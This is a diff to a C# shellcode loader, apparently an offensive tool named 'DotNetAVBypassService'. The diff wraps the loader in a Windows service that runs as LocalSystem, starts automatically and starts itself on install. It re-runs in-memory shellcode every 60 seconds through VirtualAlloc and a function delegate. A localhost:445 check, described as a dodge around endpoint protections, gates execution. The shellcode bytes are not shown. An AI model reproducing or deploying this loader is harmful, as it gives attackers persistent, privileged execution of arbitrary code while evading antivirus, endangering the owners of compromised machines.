@@ -1,12 +1,24 @@
 ﻿using System;
+using System.ComponentModel;
+using System.Configuration.Install;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.ServiceProcess;
+using System.Timers;
 
 namespace Wrapper
 {
-    class Program
+    class Program : ServiceBase
     {
+        #region Fields
+
+        private static Timer _timer; 
+
+        #endregion
+
+        #region PInvoke Setup
+
         [Flags]
         public enum AllocationType : uint
         {
@@ -51,9 +63,46 @@ namespace Wrapper
         private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);
 
         [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
-        public delegate Int32 ExecuteDelegate();
+        public delegate Int32 ExecuteDelegate(); 
+
+        #endregion
+
+        #region Constructors
+        
+        public Program()
+        {
+            ServiceName = "DotNetAVBypassService";
+            _timer = new Timer
+                         {
+                             Interval = 60000 // 60 seconds
+                         };
+            _timer.Elapsed += RunShellCode;
+        }
+        
+        #endregion
+
+        #region ServiceBase Methods
+
+        protected override void OnStart(string[] args)
+        {
+            base.OnStart(args);
+            _timer.Enabled = true;
+        }
+
+        protected override void OnStop()
+        {
+            base.OnStop();
+            _timer.Enabled = false;
+        }
+
+        #endregion
 
         static void Main()
+        {
+            Run(new Program());
+        }
+
+        private void RunShellCode(object sender, ElapsedEventArgs e)
         {
             // only run shellcode if you can connect to localhost:445, due to endpoint protections
             if (ConnectToLocalhost(445))
@@ -87,9 +136,7 @@ namespace Wrapper
                     VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
                 }
             }
-            
-            Console.ReadLine();
-        }
+        } 
 
         private static bool ConnectToLocalhost(int port)
         {
@@ -116,6 +163,36 @@ namespace Wrapper
             }
 
             return isSuccess;
+        }
+
+    }
+
+    [RunInstaller(true)]
+    public class DotNetAVBypassServiceInstaller : Installer
+    {
+        public DotNetAVBypassServiceInstaller()
+        {
+            var processInstaller = new ServiceProcessInstaller();
+            var serviceInstaller = new ServiceInstaller();
+
+            //set the privileges
+            processInstaller.Account = ServiceAccount.LocalSystem;
+
+            serviceInstaller.DisplayName = "DotNetAVBypassService";
+            serviceInstaller.StartType = ServiceStartMode.Automatic;
+
+            //must be the same as what was set in Program's constructor
+            serviceInstaller.ServiceName = "DotNetAVBypassService";
+
+            Installers.Add(processInstaller);
+            Installers.Add(serviceInstaller);
+        }
+
+        public override void Install(System.Collections.IDictionary stateSaver)
+        {
+            base.Install(stateSaver);
+            ServiceController controller = new ServiceController("DotNetAVBypassService"); // Make sure this name matches the service name!
+            controller.Start();
         }
     }
 }
